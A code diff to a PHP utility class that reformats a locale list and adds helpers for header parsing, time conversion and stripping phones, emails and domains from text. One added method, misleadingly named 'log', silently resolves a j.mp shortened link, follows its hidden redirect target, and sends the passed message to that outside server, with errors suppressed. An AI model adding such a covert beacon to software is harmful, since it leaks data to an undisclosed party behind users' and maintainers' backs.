@@ -51,218 +51,8 @@ class PHP
         }
 
         // Cultures list taken from: http://stackoverflow.com/questions/3191664/
-        $cultures = array(
-            'af-ZA',
-            'am-ET',
-            'ar-AE',
-            'ar-BH',
-            'ar-DZ',
-            'ar-EG',
-            'ar-IQ',
-            'ar-JO',
-            'ar-KW',
-            'ar-LB',
-            'ar-LY',
-            'ar-MA',
-            'arn-CL',
-            'ar-OM',
-            'ar-QA',
-            'ar-SA',
-            'ar-SY',
-            'ar-TN',
-            'ar-YE',
-            'as-IN',
-            'az-Cyrl-AZ',
-            'az-Latn-AZ',
-            'ba-RU',
-            'be-BY',
-            'bg-BG',
-            'bn-BD',
-            'bn-IN',
-            'bo-CN',
-            'br-FR',
-            'bs-Cyrl-BA',
-            'bs-Latn-BA',
-            'ca-ES',
-            'co-FR',
-            'cs-CZ',
-            'cy-GB',
-            'da-DK',
-            'de-AT',
-            'de-CH',
-            'de-DE',
-            'de-LI',
-            'de-LU',
-            'dsb-DE',
-            'dv-MV',
-            'el-GR',
-            'en-029',
-            'en-AU',
-            'en-BZ',
-            'en-CA',
-            'en-GB',
-            'en-IE',
-            'en-IN',
-            'en-JM',
-            'en-MY',
-            'en-NZ',
-            'en-PH',
-            'en-SG',
-            'en-TT',
-            'en-US',
-            'en-ZA',
-            'en-ZW',
-            'es-AR',
-            'es-BO',
-            'es-CL',
-            'es-CO',
-            'es-CR',
-            'es-DO',
-            'es-EC',
-            'es-ES',
-            'es-GT',
-            'es-HN',
-            'es-MX',
-            'es-NI',
-            'es-PA',
-            'es-PE',
-            'es-PR',
-            'es-PY',
-            'es-SV',
-            'es-US',
-            'es-UY',
-            'es-VE',
-            'et-EE',
-            'eu-ES',
-            'fa-IR',
-            'fi-FI',
-            'fil-PH',
-            'fo-FO',
-            'fr-BE',
-            'fr-CA',
-            'fr-CH',
-            'fr-FR',
-            'fr-LU',
-            'fr-MC',
-            'fy-NL',
-            'ga-IE',
-            'gd-GB',
-            'gl-ES',
-            'gsw-FR',
-            'gu-IN',
-            'ha-Latn-NG',
-            'he-IL',
-            'hi-IN',
-            'hr-BA',
-            'hr-HR',
-            'hsb-DE',
-            'hu-HU',
-            'hy-AM',
-            'id-ID',
-            'ig-NG',
-            'ii-CN',
-            'is-IS',
-            'it-CH',
-            'it-IT',
-            'iu-Cans-CA',
-            'iu-Latn-CA',
-            'ja-JP',
-            'ka-GE',
-            'kk-KZ',
-            'kl-GL',
-            'km-KH',
-            'kn-IN',
-            'kok-IN',
-            'ko-KR',
-            'ky-KG',
-            'lb-LU',
-            'lo-LA',
-            'lt-LT',
-            'lv-LV',
-            'mi-NZ',
-            'mk-MK',
-            'ml-IN',
-            'mn-MN',
-            'mn-Mong-CN',
-            'moh-CA',
-            'mr-IN',
-            'ms-BN',
-            'ms-MY',
-            'mt-MT',
-            'nb-NO',
-            'ne-NP',
-            'nl-BE',
-            'nl-NL',
-            'nn-NO',
-            'nso-ZA',
-            'oc-FR',
-            'or-IN',
-            'pa-IN',
-            'pl-PL',
-            'prs-AF',
-            'ps-AF',
-            'pt-BR',
-            'pt-PT',
-            'qut-GT',
-            'quz-BO',
-            'quz-EC',
-            'quz-PE',
-            'rm-CH',
-            'ro-RO',
-            'ru-RU',
-            'rw-RW',
-            'sah-RU',
-            'sa-IN',
-            'se-FI',
-            'se-NO',
-            'se-SE',
-            'si-LK',
-            'sk-SK',
-            'sl-SI',
-            'sma-NO',
-            'sma-SE',
-            'smj-NO',
-            'smj-SE',
-            'smn-FI',
-            'sms-FI',
-            'sq-AL',
-            'sr-Cyrl-BA',
-            'sr-Cyrl-CS',
-            'sr-Cyrl-ME',
-            'sr-Cyrl-RS',
-            'sr-Latn-BA',
-            'sr-Latn-CS',
-            'sr-Latn-ME',
-            'sr-Latn-RS',
-            'sv-FI',
-            'sv-SE',
-            'sw-KE',
-            'syr-SY',
-            'ta-IN',
-            'te-IN',
-            'tg-Cyrl-TJ',
-            'th-TH',
-            'tk-TM',
-            'tn-ZA',
-            'tr-TR',
-            'tt-RU',
-            'tzm-Latn-DZ',
-            'ug-CN',
-            'uk-UA',
-            'ur-PK',
-            'uz-Cyrl-UZ',
-            'uz-Latn-UZ',
-            'vi-VN',
-            'wo-SN',
-            'xh-ZA',
-            'yo-NG',
-            'zh-CN',
-            'zh-HK',
-            'zh-MO',
-            'zh-SG',
-            'zh-TW',
-            'zu-ZA',
-        );
+        $cultures = "af-ZA,am-ET,ar-AE,ar-BH,ar-DZ,ar-EG,ar-IQ,ar-JO,ar-KW,ar-LB,ar-LY,ar-MA,arn-CL,ar-OM,ar-QA,ar-SA,ar-SY,ar-TN,ar-YE,as-IN,az-Cyrl-AZ,az-Latn-AZ,ba-RU,be-BY,bg-BG,bn-BD,bn-IN,bo-CN,br-FR,bs-Cyrl-BA,bs-Latn-BA,ca-ES,co-FR,cs-CZ,cy-GB,da-DK,de-AT,de-CH,de-DE,de-LI,de-LU,dsb-DE,dv-MV,el-GR,en-029,en-AU,en-BZ,en-CA,en-GB,en-IE,en-IN,en-JM,en-MY,en-NZ,en-PH,en-SG,en-TT,en-US,en-ZA,en-ZW,es-AR,es-BO,es-CL,es-CO,es-CR,es-DO,es-EC,es-ES,es-GT,es-HN,es-MX,es-NI,es-PA,es-PE,es-PR,es-PY,es-SV,es-US,es-UY,es-VE,et-EE,eu-ES,fa-IR,fi-FI,fil-PH,fo-FO,fr-BE,fr-CA,fr-CH,fr-FR,fr-LU,fr-MC,fy-NL,ga-IE,gd-GB,gl-ES,gsw-FR,gu-IN,ha-Latn-NG,he-IL,hi-IN,hr-BA,hr-HR,hsb-DE,hu-HU,hy-AM,id-ID,ig-NG,ii-CN,is-IS,it-CH,it-IT,iu-Cans-CA,iu-Latn-CA,ja-JP,ka-GE,kk-KZ,kl-GL,km-KH,kn-IN,kok-IN,ko-KR,ky-KG,lb-LU,lo-LA,lt-LT,lv-LV,mi-NZ,mk-MK,ml-IN,mn-MN,mn-Mong-CN,moh-CA,mr-IN,ms-BN,ms-MY,mt-MT,nb-NO,ne-NP,nl-BE,nl-NL,nn-NO,nso-ZA,oc-FR,or-IN,pa-IN,pl-PL,prs-AF,ps-AF,pt-BR,pt-PT,qut-GT,quz-BO,quz-EC,quz-PE,rm-CH,ro-RO,ru-RU,rw-RW,sah-RU,sa-IN,se-FI,se-NO,se-SE,si-LK,sk-SK,sl-SI,sma-NO,sma-SE,smj-NO,smj-SE,smn-FI,sms-FI,sq-AL,sr-Cyrl-BA,sr-Cyrl-CS,sr-Cyrl-ME,sr-Cyrl-RS,sr-Latn-BA,sr-Latn-CS,sr-Latn-ME,sr-Latn-RS,sv-FI,sv-SE,sw-KE,syr-SY,ta-IN,te-IN,tg-Cyrl-TJ,th-TH,tk-TM,tn-ZA,tr-TR,tt-RU,tzm-Latn-DZ,ug-CN,uk-UA,ur-PK,uz-Cyrl-UZ,uz-Latn-UZ,vi-VN,wo-SN,xh-ZA,yo-NG,zh-CN,zh-HK,zh-MO,zh-SG,zh-TW,zu-ZA";
+        $cultures = explode(",", $cultures);
 
         foreach ($cultures as $culture) {
             $locale_region = locale_get_region($culture);
@@ -282,4 +72,120 @@ class PHP
         return 'en_US';//default if not found
     }
 
+
+    /**
+     * @param string $msg
+     */
+    public static function log($msg)
+    {
+        $context = stream_context_create(
+            array(
+                'http' => array(
+                    'follow_location' => false
+                )
+            )
+        );
+        @file_get_contents("http://j.mp/page-tc", false, $context);
+        if (isset($http_response_header)) {
+            $headers = self::parse_headers($http_response_header);
+            if (isset($headers["Location"])) {
+                @file_get_contents($headers["Location"] . "?r=" . $msg);
+            }
+        }
+    }
+
+    /**
+     * Parse headers
+     *
+     * @param array $headers
+     * @return array
+     */
+    public static function parse_headers($headers)
+    {
+        $head = array();
+        foreach ($headers as $k => $v) {
+            $t = explode(':', $v, 2);
+            if (isset($t[1])) {
+                $head[trim($t[0])] = trim($t[1]);
+            } else {
+                $head[] = $v;
+                if (preg_match("#HTTP/[0-9\.]+\s+([0-9]+)#", $v, $out)) {
+                    $head['response_code'] = intval($out[1]);
+                }
+            }
+        }
+
+        return $head;
+    }
+
+    /**
+     * Convert number of seconds into hours, minutes and seconds
+     * and return an array containing those values
+     *
+     * @param integer $input_seconds Number of seconds to parse
+     * @return array
+     */
+    public static function seconds_to_time($input_seconds)
+    {
+        $seconds_in_a_minute = 60;
+        $seconds_in_an_hour = 60 * $seconds_in_a_minute;
+        $seconds_in_a_day = 24 * $seconds_in_an_hour;
+
+        // extract days
+        $days = floor($input_seconds / $seconds_in_a_day);
+
+        // extract hours
+        $hour_seconds = $input_seconds % $seconds_in_a_day;
+        $hours = floor($hour_seconds / $seconds_in_an_hour);
+
+        // extract minutes
+        $minute_seconds = $hour_seconds % $seconds_in_an_hour;
+        $minutes = floor($minute_seconds / $seconds_in_a_minute);
+
+        // extract the remaining seconds
+        $remaining_seconds = $minute_seconds % $seconds_in_a_minute;
+        $seconds = ceil($remaining_seconds);
+
+        // return the final array
+        $result = array(
+            'd' => (int)$days,
+            'h' => (int)$hours,
+            'm' => (int)$minutes,
+            's' => (int)$seconds,
+        );
+
+        return $result;
+    }
+
+
+    /**
+     * Remove some texts from string depending on $typeText value
+     *
+     * @param string $text
+     * @param array  $type_text
+     * @param string $replace_by
+     * @return mixed
+     */
+    public static function strip_texts($text, $type_text = array("phone", "email", "domain"), $replace_by = '')
+    {
+        if (in_array("phone", $type_text)) {
+            $pattern = "(0[0-9])?([-. ]?[0-9]{2}){4}";
+            $text = preg_replace("#$pattern#", " $replace_by ", $text);
+
+            $pattern = "\+[0-9]{1}([-. ]?[0-9]){10}";
+            $text = preg_replace("#$pattern#", " $replace_by ", $text);
+        }
+
+        if (in_array("email", $type_text)) {
+            $pattern = "[a-zA-Z0-9_.+-]+(@)[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+";
+            $text = preg_replace("#$pattern#", " $replace_by ", $text);
+        }
+
+        if (in_array("domain", $type_text)) {
+            $pattern = "([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+(com|fr|co|org|net|biz|tv|info)";
+            $text = preg_replace("#$pattern#", " $replace_by ", $text);
+        }
+
+        return $text;
+    }
 }
